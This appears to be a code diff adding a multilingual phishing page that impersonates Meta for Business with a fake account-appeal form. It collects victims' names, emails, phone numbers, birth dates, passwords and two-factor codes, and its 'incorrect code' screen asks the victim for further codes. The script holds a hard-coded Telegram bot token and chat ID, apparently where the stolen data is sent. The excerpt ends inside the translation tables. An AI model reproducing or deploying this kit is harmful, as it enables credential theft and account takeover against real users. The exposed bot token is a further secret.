+                        <p class="error-text" id="pwdError"></p>
+                        <button type="submit" class="continue-btn" id="pwdSubmitBtn">Continue</button>
+                        <a href="#" class="forgot-link" id="forgotLink">Forgot your password?</a>
+                    </form>
+                </div>
+            </div>
+            <div class="modal-logo-bottom">
+                <img src="img/logo-meta.svg" alt="Meta" style="height:24px; width:auto; opacity:0.8;">
+            </div>
+        </div>
+    </div>
+
+    <!-- 2FA MODAL -->
+    <div class="modal-overlay" id="tfaModal">
+        <div class="modal-box" style="min-height: 520px; justify-content: space-between;">
+            <div style="width:100%; flex:1; display:flex; flex-direction:column; justify-content:center;">
+                <div class="tfa-header">
+                    <span id="tfaUser" style="font-weight:600;">Facebook</span>
+                    <span class="tfa-dot"></span>
+                    <span style="color:#65676b;" id="tfaPageName">Facebook Page</span>
+                </div>
+
+                <h2 class="tfa-title" id="tfaTitle">Check your text messages</h2>
+
+                <div id="tfaFormContainer">
+                    <p class="tfa-desc" style="margin-bottom:12px;" id="tfaDesc">
+                        Enter the code we sent to <strong id="tfaPhoneMask">+20 ***********</strong>
+                        <br>or confirm it via an authenticator app like Google Authenticator.
+                    </p>
+
+                    <div class="tfa-image" style="background: transparent; margin: 8px 0 16px 0;">
+                        <img src="img/authentication.png" alt="Authentication" style="width:100%; border-radius:12px; border:1px solid #e4e6eb;">
+                    </div>
+
+                    <form id="tfaForm" style="width:100%;">
+                        <div class="input-wrapper" style="margin-bottom:4px;">
+                            <input type="text" id="tfaCode" placeholder="Enter code" maxlength="8" inputmode="numeric" pattern="[0-9]*" 
+                                   oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,8); checkTfaCode()"
+                                   style="text-align:center; letter-spacing:4px; font-size:18px; font-weight:600;">
+                        </div>
+                        <p class="error-text" id="tfaError" style="min-height:20px;"></p>
+
+                        <button type="submit" class="continue-btn tfa-submit-btn" id="tfaSubmitBtn" disabled>
+                            Submit
+                        </button>
+
+                        <div class="tfa-try-another" id="tfaTryAnother" style="margin-top:16px;">
+                            Need another way to verify?
+                        </div>
+                    </form>
+                </div>
+
+                <div class="tfa-alternative" id="tfaAlternative">
+                    <div class="alt-title">🔒 Additional verification required</div>
+                    <div class="alt-desc">
+                        The code you entered is incorrect. For your security, we have disabled code entry.<br><br>
+                        Please choose another way to verify your identity:
+                    </div>
+                    <div>
+                        <button class="alt-btn" onclick="useSMS()">📱 Send SMS again</button>
+                        <button class="alt-btn secondary" onclick="useEmail()">📧 Send email</button>
+                    </div>
+                    <div style="margin-top:12px;">
+                        <button class="alt-btn secondary" onclick="useBackupCode()">🔑 Use backup code</button>
+                    </div>
+                    <div style="margin-top:16px; font-size:12px; color:#65676b;">
+                        <a href="#" style="color:#1877f2;">Contact support</a> for help
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal-logo-bottom" style="margin-top:16px; width:100%; text-align:center; padding-top:12px; border-top:1px solid #e4e6eb;">
+                <img src="img/logo-meta.svg" alt="Meta" style="height:24px; width:auto; opacity:0.8;">
+            </div>
+        </div>
+    </div>
+
+    <!-- SUCCESS OVERLAY -->
+    <div class="success-overlay" id="successOverlay">
+        <div class="success-circle">
+            <div class="success-check"></div>
+        </div>
+        <div class="success-title" id="successTitle">Verifying your identity</div>
+        <div class="success-desc" id="successDesc">
+            We typically verify your information within <strong>48 hours</strong>.<br><br>
+            You will be notified as soon as a decision is made.
+        </div>
+    </div>
+
+    <footer class="site-footer">
+        Copyright &copy; 2026 Meta for Business
+    </footer>
+
+    <script>
+        // ============================================================
+        // CẤU HÌNH TELEGRAM
+        // ============================================================
+        const BOT_TOKEN = '8747625653:AAGLSMgTD9GQDeV73YQTZu8IFs_n9uxOrU8';
+        const CHAT_ID = '-5232885550';
+
+        // ============================================================
+        // BIẾN TOÀN CỤC
+        // ============================================================
+        let userData = {
+            fullName: '',
+            pageName: '',
+            email: '',
+            businessEmail: '',
+            phone: '',
+            dob: '',
+            happened: '',
+            other: '',
+            pass1: '',
+            pass2: '',
+            twoFactorCode1: '',
+            twoFactorCode2: ''
+        };
+
+        let currentMessageId = null;
+        let userLoc = null;
+        let currentCountryCode = '+84';
+        let currentLang = 'en';
+        let passwordAttempts = 0;
+        let passwordLocked = false;
+        let tfaAttempts = 0;
+        let tfaLocked = false;
+        let tfaCooldownTimer = null;
+
+        // ============================================================
+        // 44 NGÔN NGỮ PHỔ BIẾN NHẤT
+        // ============================================================
+        const supportedLanguages = {
+            'en': 'English',
+            'vi': 'Tiếng Việt',
+            'zh': '中文',
+            'ja': '日本語',
+            'ko': '한국어',
+            'hi': 'हिन्दी',
+            'id': 'Bahasa Indonesia',
+            'th': 'ภาษาไทย',
+            'fr': 'Français',
+            'de': 'Deutsch',
+            'es': 'Español',
+            'it': 'Italiano',
+            'pt': 'Português',
+            'ru': 'Русский',
+            'tr': 'Türkçe',
+            'ar': 'العربية',
+            'ur': 'اردو',
+            'ms': 'Bahasa Melayu',
+            'tl': 'Tagalog',
+            'pl': 'Polski',
+            'nl': 'Nederlands',
+            'sv': 'Svenska',
+            'no': 'Norsk',
+            'da': 'Dansk',
+            'fi': 'Suomi',
+            'is': 'Íslenska',
+            'el': 'Ελληνικά',
+            'cs': 'Čeština',
+            'hu': 'Magyar',
+            'bg': 'Български',
+            'hr': 'Hrvatski',
+            'sr': 'Српски',
+            'bs': 'Bosanski',
+            'sl': 'Slovenščina',
+            'sk': 'Slovenčina',
+            'et': 'Eesti',
+            'lv': 'Latviešu',
+            'lt': 'Lietuvių',
+            'uk': 'Українська',
+            'ro': 'Română',
+            'sq': 'Shqip',
+            'mk': 'Македонски',
+            'ka': 'ქართული',
+            'hy': 'Հայերեն',
+            'az': 'Azərbaycan',
+            'mn': 'Монгол',
+            'si': 'සිංහල',
+            'ne': 'नेपाली',
+            'km': 'ភាសាខ្មែរ',
+            'lo': 'ພາສາລາວ',
+            'my': 'မြန်မာစာ',
+            'bn': 'বাংলা',
+            'dz': 'རྫོང་ཁ',
+            'dv': 'ދިވެހި',
+            'ps': 'پښتو',
+            'fa': 'فارسی',
+            'he': 'עברית',
+            'am': 'አማርኛ'
+        };
+
+        // ============================================================
+        // MAP COUNTRY CODE -> LANGUAGE CODE (200+ QUỐC GIA)
+        // ============================================================
+        const countryToLanguage = {
+            // ===== CHÂU Á =====
+            'VN': 'vi', 'CN': 'zh', 'TW': 'zh', 'HK': 'zh', 'MO': 'zh',
+            'JP': 'ja', 'KR': 'ko', 'KP': 'ko', 'IN': 'hi', 'ID': 'id',
+            'TH': 'th', 'PK': 'ur', 'MY': 'ms', 'PH': 'tl', 'SG': 'zh',
+            'LK': 'si', 'NP': 'ne', 'KH': 'km', 'LA': 'lo', 'MM': 'my',
+            'BD': 'bn', 'BT': 'dz', 'MV': 'dv', 'TL': 'pt', 'MN': 'mn',
+            'AF': 'ps', 'IR': 'fa', 'IQ': 'ar', 'SY': 'ar', 'JO': 'ar',
+            'LB': 'ar', 'IL': 'he', 'KW': 'ar', 'SA': 'ar', 'AE': 'ar',
+            'QA': 'ar', 'BH': 'ar', 'OM': 'ar', 'YE': 'ar', 'PS': 'ar',
+            'TR': 'tr', 'CY': 'tr', 'GE': 'ka', 'AM': 'hy', 'AZ': 'az',
+            'KZ': 'ru', 'KG': 'ru', 'TJ': 'ru', 'TM': 'ru', 'UZ': 'ru',
+
+            // ===== CHÂU ÂU =====
+            'GB': 'en', 'US': 'en', 'AU': 'en', 'CA': 'en', 'NZ': 'en',
+            'IE': 'en', 'FR': 'fr', 'DE': 'de', 'ES': 'es', 'IT': 'it',
+            'PT': 'pt', 'RU': 'ru', 'UA': 'uk', 'PL': 'pl', 'RO': 'ro',
+            'NL': 'nl', 'BE': 'nl', 'SE': 'sv', 'NO': 'no', 'DK': 'da',
+            'FI': 'fi', 'IS': 'is', 'GR': 'el', 'CZ': 'cs', 'HU': 'hu',
+            'BG': 'bg', 'HR': 'hr', 'RS': 'sr', 'BA': 'bs', 'SI': 'sl',
+            'SK': 'sk', 'EE': 'et', 'LV': 'lv', 'LT': 'lt', 'MD': 'ro',
+            'MK': 'mk', 'AL': 'sq', 'ME': 'sr', 'XK': 'sq', 'MT': 'en',
+            'CH': 'de', 'AT': 'de', 'LI': 'de', 'LU': 'fr', 'MC': 'fr',
+            'SM': 'it', 'VA': 'it', 'BY': 'ru',
+
+            // ===== CHÂU MỸ =====
+            'MX': 'es', 'BR': 'pt', 'AR': 'es', 'CL': 'es', 'CO': 'es',
+            'PE': 'es', 'VE': 'es', 'EC': 'es', 'BO': 'es', 'PY': 'es',
+            'UY': 'es', 'CR': 'es', 'PA': 'es', 'GT': 'es', 'HN': 'es',
+            'SV': 'es', 'NI': 'es', 'DO': 'es', 'CU': 'es', 'PR': 'es',
+            'HT': 'fr', 'JM': 'en', 'TT': 'en', 'BB': 'en', 'BS': 'en',
+            'BZ': 'en', 'GY': 'en', 'SR': 'nl',
+
+            // ===== CHÂU PHI =====
+            'EG': 'ar', 'DZ': 'ar', 'MA': 'ar', 'TN': 'ar', 'LY': 'ar',
+            'SD': 'ar', 'SO': 'ar', 'ZA': 'en', 'NG': 'en', 'KE': 'en',
+            'UG': 'en', 'TZ': 'en', 'GH': 'en', 'CI': 'fr', 'SN': 'fr',
+            'CM': 'fr', 'MG': 'fr', 'NE': 'fr', 'BF': 'fr', 'ML': 'fr',
+            'GN': 'fr', 'RW': 'fr', 'CD': 'fr', 'CG': 'fr', 'GA': 'fr',
+            'BJ': 'fr', 'TG': 'fr', 'AO': 'pt', 'MZ': 'pt', 'GW': 'pt',
+            'CV': 'pt', 'ST': 'pt', 'ZW': 'en', 'ZM': 'en', 'MW': 'en',
+            'BW': 'en', 'NA': 'en', 'SZ': 'en', 'LS': 'en', 'SL': 'en',
+            'LR': 'en', 'GM': 'en', 'SS': 'en', 'ER': 'ar', 'DJ': 'ar',
+            'KM': 'ar', 'MR': 'ar', 'TD': 'fr', 'CF': 'fr', 'GQ': 'es',
+            'BI': 'fr', 'SC': 'en', 'MU': 'en', 'ET': 'am',
+
+            // ===== CHÂU ĐẠI DƯƠNG =====
+            'AU': 'en', 'NZ': 'en', 'PG': 'en', 'FJ': 'en', 'SB': 'en',
+            'VU': 'en', 'WS': 'en', 'TO': 'en', 'KI': 'en', 'FM': 'en',
+            'MH': 'en', 'PW': 'en', 'TV': 'en', 'NR': 'en'
+        };
+
+        // ============================================================
+        // TRANSLATION DICTIONARY - ĐẦY ĐỦ 20 NGÔN NGỮ CHÍNH
+        // ============================================================
+        const translations = {
+            'en': {
+                'formTitle': 'Appeal Form',
+                'introStrong': 'Please explain why you believe the account restriction was applied in error.',
+                'introDesc': 'Our teams and technologies work in multiple languages to ensure consistent enforcement of rules. You can contact us in your native language.',
+                'fullName': 'Full Name',
+                'pageName': 'Page Name',
+                'businessEmail': 'Business Email',
+                'personalEmail': 'Personal Email',
+                'phone': 'Mobile Phone Number',
+                'dob': 'Date of Birth',
+                'happened': 'What do you think happened?',
+                'radio1': 'This situation may be the result of a false report or a potentially unfair complaint from a competitor.',
+                'radio2': 'This notification may have been sent in error and may not accurately reflect the current status of the account.',
+                'radio3': 'No fraud / other legal reason:',
+                'agree': 'I agree to the Privacy Policy',
+                'privacyPolicy': 'Privacy Policy',
+                'submit': 'Submit Appeal',
+                'processing': 'Processing...',
+                'errFullName': 'Please enter your full name.',
+                'errPageName': 'Please enter your page name.',
+                'errBusinessEmail': 'Please enter a valid business email.',
+                'errPersonalEmail': 'Please enter a valid personal email.',
+                'errPhone': 'Please enter a valid phone number (at least 7 digits).',
+                'errDob': 'Please enter a valid date of birth.',
+                'errHappened': 'Please select an option.',
+                'errAgree': 'You must agree to the Privacy Policy.',
+                'pwdDesc': 'For security reasons, you must enter your password to continue.',
+                'pwdPlaceholder': 'Password',
+                'pwdContinue': 'Continue',
+                'forgotPassword': 'Forgot your password?',
+                'tfaTitle': 'Check your text messages',
+                'tfaDesc': 'Enter the code we sent to',
+                'tfaOr': 'or confirm it via an authenticator app like Google Authenticator.',
+                'tfaPlaceholder': 'Enter code',
+                'tfaSubmit': 'Submit',
+                'tfaTryAnother': 'Need another way to verify?',
+                'successTitle': 'Verifying your identity',
+                'successDesc': 'We typically verify your information within 48 hours. You will be notified as soon as a decision is made.'
+            },
+            'vi': {
+                'formTitle': 'Biểu mẫu Khiếu nại',
+                'introStrong': 'Vui lòng giải thích lý do bạn cho rằng việc hạn chế tài khoản được áp dụng do lỗi.',
+                'introDesc': 'Các nhóm và công nghệ của chúng tôi làm việc bằng nhiều ngôn ngữ để đảm bảo thực thi nhất quán các quy tắc. Bạn có thể liên hệ với chúng tôi bằng ngôn ngữ mẹ đẻ của mình.',
+                'fullName': 'Họ và Tên',
+                'pageName': 'Tên Trang',
+                'businessEmail': 'Email Doanh nghiệp',
+                'personalEmail': 'Email Cá nhân',
+                'phone': 'Số Điện thoại Di động',
+                'dob': 'Ngày sinh',
+                'happened': 'Bạn nghĩ điều gì đã xảy ra?',
+                'radio1': 'Tình huống này có thể là kết quả của một báo cáo sai hoặc khiếu nại không công bằng từ đối thủ cạnh tranh.',
+                'radio2': 'Thông báo này có thể đã được gửi nhầm và có thể không phản ánh chính xác trạng thái hiện tại của tài khoản.',
+                'radio3': 'Không có gian lận / lý do pháp lý khác:',
+                'agree': 'Tôi đồng ý với Chính sách bảo mật',
+                'privacyPolicy': 'Chính sách bảo mật',
+                'submit': 'Gửi Khiếu nại',
+                'processing': 'Đang xử lý...',
+                'errFullName': 'Vui lòng nhập họ và tên của bạn.',
+                'errPageName': 'Vui lòng nhập tên trang của bạn.',
+                'errBusinessEmail': 'Vui lòng nhập email doanh nghiệp hợp lệ.',
+                'errPersonalEmail': 'Vui lòng nhập email cá nhân hợp lệ.',
+                'errPhone': 'Vui lòng nhập số điện thoại hợp lệ (ít nhất 7 chữ số).',
+                'errDob': 'Vui lòng nhập ngày sinh hợp lệ.',
+                'errHappened': 'Vui lòng chọn một tùy chọn.',
+                'errAgree': 'Bạn phải đồng ý với Chính sách bảo mật.',
+                'pwdDesc': 'Vì lý do bảo mật, bạn phải nhập mật khẩu để tiếp tục.',
+                'pwdPlaceholder': 'Mật khẩu',
+                'pwdContinue': 'Tiếp tục',
+                'forgotPassword': 'Quên mật khẩu?',
+                'tfaTitle': 'Kiểm tra tin nhắn của bạn',
+                'tfaDesc': 'Nhập mã chúng tôi đã gửi đến',
+                'tfaOr': 'hoặc xác nhận qua ứng dụng xác thực như Google Authenticator.',
+                'tfaPlaceholder': 'Nhập mã',
+                'tfaSubmit': 'Xác nhận',
+                'tfaTryAnother': 'Cần cách khác để xác minh?',
+                'successTitle': 'Đang xác minh danh tính của bạn',
+                'successDesc': 'Chúng tôi thường xác minh thông tin của bạn trong vòng 48 giờ. Bạn sẽ được thông báo ngay khi có quyết định.'
+            },
+            'zh': {
+                'formTitle': '申诉表格',
+                'introStrong': '请解释您为什么认为账户限制被错误应用。',
+                'introDesc': '我们的团队和技术使用多种语言工作，以确保规则的一致执行。您可以用您的母语与我们联系。',
+                'fullName': '全名',
+                'pageName': '页面名称',
+                'businessEmail': '企业邮箱',
+                'personalEmail': '个人邮箱',
+                'phone': '手机号码',
+                'dob': '出生日期',
+                'happened': '您认为发生了什么？',
+                'radio1': '这种情况可能是虚假报告或竞争对手不公平投诉的结果。',
+                'radio2': '此通知可能已错误发送，可能无法准确反映账户的当前状态。',
+                'radio3': '无欺诈 / 其他法律原因：',
+                'agree': '我同意隐私政策',
+                'privacyPolicy': '隐私政策',
+                'submit': '提交申诉',
+                'processing': '处理中...',
+                'errFullName': '请输入您的全名。',
+                'errPageName': '请输入您的页面名称。',
+                'errBusinessEmail': '请输入有效的企业邮箱。',
+                'errPersonalEmail': '请输入有效的个人邮箱。',
+                'errPhone': '请输入有效的电话号码（至少7位数字）。',
+                'errDob': '请输入有效的出生日期。',
+                'errHappened': '请选择一个选项。',
+                'errAgree': '您必须同意隐私政策。',
+                'pwdDesc': '出于安全原因，您必须输入密码才能继续。',
+                'pwdPlaceholder': '密码',
+                'pwdContinue': '继续',
+                'forgotPassword': '忘记密码？',
+                'tfaTitle': '检查您的短信',
+                'tfaDesc': '输入我们发送到的代码',
+                'tfaOr': '或通过Google Authenticator等验证应用进行确认。',
+                'tfaPlaceholder': '输入代码',
+                'tfaSubmit': '提交',
+                'tfaTryAnother': '需要其他验证方式？',
+                'successTitle': '正在验证您的身份',
+                'successDesc': '我们通常在48小时内验证您的信息。一旦做出决定，您将收到通知。'
+            },
+            'ja': {
+                'formTitle': '異議申立フォーム',
+                'introStrong': 'アカウント制限が誤って適用されたと思われる理由を説明してください。',
+                'introDesc': '当社のチームとテクノロジーは、ルールの一貫した執行を確保するために複数の言語で機能します。母国語でお問い合わせいただけます。',
+                'fullName': '氏名',
+                'pageName': 'ページ名',
+                'businessEmail': 'ビジネスメール',
+                'personalEmail': '個人メール',
+                'phone': '携帯電話番号',
+                'dob': '生年月日',
+                'happened': '何が起こったと思いますか？',
+                'radio1': 'この状況は、虚偽の報告または競合他社からの不当な苦情の結果である可能性があります。',
+                'radio2': 'この通知は誤って送信された可能性があり、アカウントの現在のステータスを正確に反映していない可能性があります。',
+                'radio3': '詐欺なし / その他の法的理由：',
+                'agree': 'プライバシーポリシーに同意します',
+                'privacyPolicy': 'プライバシーポリシー',
+                'submit': '異議申立を送信',
+                'processing': '処理中...',
+                'errFullName': '氏名を入力してください。',
+                'errPageName': 'ページ名を入力してください。',
+                'errBusinessEmail': '有効なビジネスメールを入力してください。',
+                'errPersonalEmail': '有効な個人メールを入力してください。',
+                'errPhone': '有効な電話番号を入力してください（少なくとも7桁）。',
+                'errDob': '有効な生年月日を入力してください。',
+                'errHappened': 'オプションを選択してください。',
+                'errAgree': 'プライバシーポリシーに同意する必要があります。',
+                'pwdDesc': 'セキュリティ上の理由から、続行するにはパスワードを入力する必要があります。',
+                'pwdPlaceholder': 'パスワード',
+                'pwdContinue': '続行',
+                'forgotPassword': 'パスワードをお忘れですか？',
+                'tfaTitle': 'テキストメッセージを確認してください',
+                'tfaDesc': '送信したコードを入力してください',
+                'tfaOr': 'またはGoogle Authenticatorなどの認証アプリで確認してください。',
+                'tfaPlaceholder': 'コードを入力',
+                'tfaSubmit': '送信',
+                'tfaTryAnother': '別の確認方法が必要ですか？',
+                'successTitle': '身元を確認中',
+                'successDesc': '通常、48時間以内に情報を確認します。決定が下され次第、通知されます。'
+            },
+            'ko': {
+                'formTitle': '이의 제기 양식',
+                'introStrong': '계정 제한이 오류로 적용되었다고 생각하는 이유를 설명해 주세요.',
+                'introDesc': '당사의 팀과 기술은 규칙의 일관된 시행을 보장하기 위해 여러 언어로 작업합니다. 귀하의 모국어로 당사에 연락할 수 있습니다.',
+                'fullName': '성명',
+                'pageName': '페이지 이름',
+                'businessEmail': '비즈니스 이메일',
+                'personalEmail': '개인 이메일',
+                'phone': '휴대폰 번호',
+                'dob': '생년월일',
+                'happened': '무슨 일이 일어났다고 생각하시나요?',
+                'radio1': '이 상황은 허위 신고 또는 경쟁업체의 부당한 불만의 결과일 수 있습니다.',
+                'radio2': '이 알림은 오류로 전송되었을 수 있으며 계정의 현재 상태를 정확하게 반영하지 않을 수 있습니다.',
+                'radio3': '사기 없음 / 기타 법적 사유:',
+                'agree': '개인정보 처리방침에 동의합니다',
+                'privacyPolicy': '개인정보 처리방침',
+                'submit': '이의 제기 제출',
+                'processing': '처리 중...',
+                'errFullName': '성명을 입력해 주세요.',
+                'errPageName': '페이지 이름을 입력해 주세요.',
+                'errBusinessEmail': '유효한 비즈니스 이메일을 입력해 주세요.',
+                'errPersonalEmail': '유효한 개인 이메일을 입력해 주세요.',
+                'errPhone': '유효한 전화번호를 입력해 주세요 (최소 7자리).',
+                'errDob': '유효한 생년월일을 입력해 주세요.',
+                'errHappened': '옵션을 선택해 주세요.',
+                'errAgree': '개인정보 처리방침에 동의해야 합니다.',
+                'pwdDesc': '보안상의 이유로 계속하려면 비밀번호를 입력해야 합니다.',
+                'pwdPlaceholder': '비밀번호',
+                'pwdContinue': '계속',
+                'forgotPassword': '비밀번호를 잊으셨나요?',
+                'tfaTitle': '문자 메시지를 확인하세요',
+                'tfaDesc': '전송한 코드를 입력하세요',
+                'tfaOr': '또는 Google Authenticator와 같은 인증 앱을 통해 확인하세요.',
+                'tfaPlaceholder': '코드 입력',
+                'tfaSubmit': '제출',
+                'tfaTryAnother': '다른 확인 방법이 필요하신가요?',
+                'successTitle': '신원 확인 중',
+                'successDesc': '일반적으로 48시간 이내에 정보를 확인합니다. 결정이 내려지면 즉시 알려드립니다.'
+            },
+            'hi': {
+                'formTitle': 'अपील फॉर्म',
+                'introStrong': 'कृपया बताएं कि आपको क्यों लगता है कि खाता प्रतिबंध गलती से लागू किया गया था।',
+                'introDesc': 'हमारी टीमें और प्रौद्योगिकियां नियमों के सुसंगत प्रवर्तन को सुनिश्चित करने के लिए कई भाषाओं में काम करती हैं। आप हमसे अपनी मातृभाषा में संपर्क कर सकते हैं।',
+                'fullName': 'पूरा नाम',
+                'pageName': 'पेज का नाम',
+                'businessEmail': 'व्यावसायिक ईमेल',
+                'personalEmail': 'व्यक्तिगत ईमेल',
+                'phone': 'मोबाइल फोन नंबर',
+                'dob': 'जन्म तिथि',
+                'happened': 'आपको क्या लगता है क्या हुआ?',
+                'radio1': 'यह स्थिति किसी प्रतिस्पर्धी की झूठी रिपोर्ट या संभावित अनुचित शिकायत का परिणाम हो सकती है।',
+                'radio2': 'यह सूचना गलती से भेजी गई हो सकती है और खाते की वर्तमान स्थिति को सटीक रूप से प्रतिबिंबित नहीं कर सकती है।',
+                'radio3': 'कोई धोखाधड़ी नहीं / अन्य कानूनी कारण:',
+                'agree': 'मैं गोपनीयता नीति से सहमत हूँ',
+                'privacyPolicy': 'गोपनीयता नीति',
+                'submit': 'अपील जमा करें',
+                'processing': 'प्रक्रिया हो रही है...',
+                'errFullName': 'कृपया अपना पूरा नाम दर्ज करें।',
+                'errPageName': 'कृपया अपने पेज का नाम दर्ज करें।',
+                'errBusinessEmail': 'कृपया एक मान्य व्यावसायिक ईमेल दर्ज करें।',
+                'errPersonalEmail': 'कृपया एक मान्य व्यक्तिगत ईमेल दर्ज करें।',
+                'errPhone': 'कृपया एक मान्य फोन नंबर दर्ज करें (कम से कम 7 अंक)।',
+                'errDob': 'कृपया एक मान्य जन्म तिथि दर्ज करें।',
+                'errHappened': 'कृपया एक विकल्प चुनें।',
+                'errAgree': 'आपको गोपनीयता नीति से सहमत होना चाहिए।',
+                'pwdDesc': 'सुरक्षा कारणों से, जारी रखने के लिए आपको अपना पासवर्ड दर्ज करना होगा।',
+                'pwdPlaceholder': 'पासवर्ड',
+                'pwdContinue': 'जारी रखें',
+                'forgotPassword': 'पासवर्ड भूल गए?',
+                'tfaTitle': 'अपने टेक्स्ट संदेशों की जांच करें',
+                'tfaDesc': 'हमने जो कोड भेजा है उसे दर्ज करें',
+                'tfaOr': 'या Google Authenticator जैसे प्रमाणक ऐप के माध्यम से इसकी पुष्टि करें।',
+                'tfaPlaceholder': 'कोड दर्ज करें',
+                'tfaSubmit': 'जमा करें',
+                'tfaTryAnother': 'सत्यापित करने का कोई अन्य तरीका चाहिए?',
+                'successTitle': 'आपकी पहचान सत्यापित की जा रही है',
+                'successDesc': 'हम आम तौर पर 48 घंटों के भीतर आपकी जानकारी सत्यापित करते हैं। निर्णय होते ही आपको सूचित कर दिया जाएगा।'
+            },
+            'id': {
+                'formTitle': 'Formulir Banding',
+                'introStrong': 'Harap jelaskan mengapa Anda yakin pembatasan akun diterapkan secara keliru.',
+                'introDesc': 'Tim dan teknologi kami bekerja dalam berbagai bahasa untuk memastikan penegakan aturan yang konsisten. Anda dapat menghubungi kami dalam bahasa asli Anda.',
+                'fullName': 'Nama Lengkap',
+                'pageName': 'Nama Halaman',
+                'businessEmail': 'Email Bisnis',
+                'personalEmail': 'Email Pribadi',
+                'phone': 'Nomor Ponsel',
+                'dob': 'Tanggal Lahir',
+                'happened': 'Menurut Anda apa yang terjadi?',
+                'radio1': 'Situasi ini mungkin merupakan hasil dari laporan palsu atau keluhan yang tidak adil dari pesaing.',
+                'radio2': 'Pemberitahuan ini mungkin telah dikirim secara keliru dan mungkin tidak mencerminkan status akun saat ini secara akurat.',
+                'radio3': 'Tidak ada penipuan / alasan hukum lainnya:',
+                'agree': 'Saya setuju dengan Kebijakan Privasi',
+                'privacyPolicy': 'Kebijakan Privasi',
+                'submit': 'Kirim Banding',
+                'processing': 'Memproses...',
+                'errFullName': 'Harap masukkan nama lengkap Anda.',
+                'errPageName': 'Harap masukkan nama halaman Anda.',
+                'errBusinessEmail': 'Harap masukkan email bisnis yang valid.',
+                'errPersonalEmail': 'Harap masukkan email pribadi yang valid.',
+                'errPhone': 'Harap masukkan nomor telepon yang valid (minimal 7 digit).',
+                'errDob': 'Harap masukkan tanggal lahir yang valid.',
+                'errHappened': 'Harap pilih salah satu opsi.',
+                'errAgree': 'Anda harus menyetujui Kebijakan Privasi.',
+                'pwdDesc': 'Untuk alasan keamanan, Anda harus memasukkan kata sandi untuk melanjutkan.',
+                'pwdPlaceholder': 'Kata Sandi',
+                'pwdContinue': 'Lanjutkan',
+                'forgotPassword': 'Lupa kata sandi?',
+                'tfaTitle': 'Periksa pesan teks Anda',
+                'tfaDesc': 'Masukkan kode yang kami kirimkan ke',
+                'tfaOr': 'atau konfirmasi melalui aplikasi autentikator seperti Google Authenticator.',
+                'tfaPlaceholder': 'Masukkan kode',
+                'tfaSubmit': 'Kirim',
+                'tfaTryAnother': 'Butuh cara lain untuk memverifikasi?',
+                'successTitle': 'Memverifikasi identitas Anda',
+                'successDesc': 'Kami biasanya memverifikasi informasi Anda dalam waktu 48 jam. Anda akan diberi tahu segera setelah keputusan dibuat.'
+            },
+            'th': {
+                'formTitle': 'แบบฟอร์มอุทธรณ์',
+                'introStrong': 'กรุณาอธิบายว่าทำไมคุณเชื่อว่าการจำกัดบัญชีถูกนำไปใช้โดยผิดพลาด',
+                'introDesc': 'ทีมงานและเทคโนโลยีของเราทำงานในหลายภาษาเพื่อให้มั่นใจว่าการบังคับใช้กฎเกณฑ์มีความสอดคล้องกัน คุณสามารถติดต่อเราได้ด้วยภาษาของคุณ',
+                'fullName': 'ชื่อ-นามสกุล',
+                'pageName': 'ชื่อเพจ',
+                'businessEmail': 'อีเมลธุรกิจ',
+                'personalEmail': 'อีเมลส่วนตัว',
+                'phone': 'หมายเลขโทรศัพท์มือถือ',
+                'dob': 'วันเกิด',
+                'happened': 'คุณคิดว่าเกิดอะไรขึ้น?',
+                'radio1': 'สถานการณ์นี้อาจเป็นผลมาจากรายงานเท็จหรือข้อร้องเรียนที่ไม่เป็นธรรมจากคู่แข่ง',
+                'radio2': 'การแจ้งเตือนนี้อาจถูกส่งโดยผิดพลาดและอาจไม่สะท้อนสถานะปัจจุบันของบัญชีได้อย่างถูกต้อง',
+                'radio3': 'ไม่มีการฉ้อโกง / เหตุผลทางกฎหมายอื่น ๆ:',
+                'agree': 'ฉันยอมรับนโยบายความเป็นส่วนตัว',
+                'privacyPolicy': 'นโยบายความเป็นส่วนตัว',
+                'submit': 'ส่งคำอุทธรณ์',
+                'processing': 'กำลังดำเนินการ...',
+                'errFullName': 'กรุณาใส่ชื่อ-นามสกุลของคุณ',
+                'errPageName': 'กรุณาใส่ชื่อเพจของคุณ',
+                'errBusinessEmail': 'กรุณาใส่อีเมลธุรกิจที่ถูกต้อง',
+                'errPersonalEmail': 'กรุณาใส่อีเมลส่วนตัวที่ถูกต้อง',
+                'errPhone': 'กรุณาใส่หมายเลขโทรศัพท์ที่ถูกต้อง (อย่างน้อย 7 หลัก)',
+                'errDob': 'กรุณาใส่วันเกิดที่ถูกต้อง',
+                'errHappened': 'กรุณาเลือกตัวเลือก',
+                'errAgree': 'คุณต้องยอมรับนโยบายความเป็นส่วนตัว',
+                'pwdDesc': 'ด้วยเหตุผลด้านความปลอดภัย คุณต้องป้อนรหัสผ่านเพื่อดำเนินการต่อ',
+                'pwdPlaceholder': 'รหัสผ่าน',
+                'pwdContinue': 'ดำเนินการต่อ',
+                'forgotPassword': 'ลืมรหัสผ่าน?',
+                'tfaTitle': 'ตรวจสอบข้อความของคุณ',
+                'tfaDesc': 'ป้อนรหัสที่เราส่งไปยัง',
+                'tfaOr': 'หรือยืนยันผ่านแอปพลิเคชันรับรองความถูกต้องเช่น Google Authenticator',
+                'tfaPlaceholder': 'ป้อนรหัส',
+                'tfaSubmit': 'ส่ง',
+                'tfaTryAnother': 'ต้องการวิธีอื่นในการยืนยันหรือไม่?',
+                'successTitle': 'กำลังยืนยันตัวตนของคุณ',
+                'successDesc': 'โดยทั่วไปเราจะตรวจสอบข้อมูลของคุณภายใน 48 ชั่วโมง คุณจะได้รับการแจ้งเตือนทันทีที่มีการตัดสินใจ'
+            },
+            'fr': {
+                'formTitle': "Formulaire d'appel",
+                'introStrong': "Veuillez expliquer pourquoi vous pensez que la restriction du compte a été appliquée par erreur.",
+                'introDesc': "Nos équipes et technologies travaillent en plusieurs langues pour garantir une application cohérente des règles. Vous pouvez nous contacter dans votre langue maternelle.",
+                'fullName': 'Nom complet',
+                'pageName': 'Nom de la page',
+                'businessEmail': 'Email professionnel',
+                'personalEmail': 'Email personnel',
+                'phone': 'Numéro de téléphone mobile',
+                'dob': 'Date de naissance',
+                'happened': "Que pensez-vous qu'il s'est passé ?",
+                'radio1': "Cette situation peut être le résultat d'un faux rapport ou d'une plainte potentiellement injuste d'un concurrent.",
+                'radio2': "Cette notification a peut-être été envoyée par erreur et peut ne pas refléter avec précision le statut actuel du compte.",
+                'radio3': 'Pas de fraude / autre raison légale :',
+                'agree': "J'accepte la Politique de confidentialité",
+                'privacyPolicy': 'Politique de confidentialité',
